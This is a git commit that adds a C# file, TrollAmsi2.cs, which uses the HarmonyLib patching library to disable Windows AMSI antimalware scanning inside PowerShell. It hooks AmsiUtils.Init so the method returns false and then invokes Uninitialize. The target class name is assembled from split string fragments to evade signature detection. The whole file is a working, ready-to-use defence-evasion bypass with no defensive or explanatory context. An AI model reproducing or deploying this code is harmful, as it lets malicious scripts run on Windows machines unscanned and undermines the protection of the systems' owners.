8d205ac86d5a4196e429b76f0078b2a12d4b7628
cybersectroll <dexter192123@gmail.com>
2025-05-29 14:14:14 +0800

    Create TrollAmsi2.cs

---
+++ TrollAmsi2.cs
@@ -0,0 +1,28 @@
+
+using System;
+using System.Reflection;
+using HarmonyLib;
+
+
+public class TrollAmsi2
+{
+    public static void Start()
+    {
+        var harmony = new Harmony(" ");
+
+        var theclass = Type.GetType("System.Ma" + "nage" + "ment.Auto" + "mation." + "A" + "m" + "s" + "i" + "U" + "t" + "i" + "l" + "s" + ", System.Management.Automation");        
+        var themethodInit = theclass.GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic);
+
+        var prefix = typeof(TrollAmsi2).GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic);
+        harmony.Patch(themethodInit, prefix: new HarmonyMethod(prefix));
+
+        var themethodUninitialize = theclass.GetMethod("Uninitialize", BindingFlags.Static | BindingFlags.NonPublic);
+        themethodUninitialize.Invoke(null, null);
+    }
+
+    private static bool Init()
+    {
+        return false;
+    }
+}
+
